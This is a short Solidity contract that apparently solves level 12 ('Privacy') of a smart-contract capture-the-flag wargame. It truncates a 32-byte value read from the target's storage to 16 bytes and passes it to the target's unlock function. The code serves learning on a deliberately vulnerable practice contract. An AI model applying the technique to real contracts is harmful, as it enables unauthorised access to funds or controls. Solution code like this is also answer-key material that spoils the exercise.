pragma solidity ^0.6.0;

interface Privacy {
    function unlock(bytes16 _key) external;

}



contract Level12 {
    
    function key(bytes32 _key) public pure returns (bytes16) {
	return bytes16(_key);
    }

    function _unlock(address instance ,bytes32 _key) public {
	Privacy(instance).unlock(key(_key));
    }

}
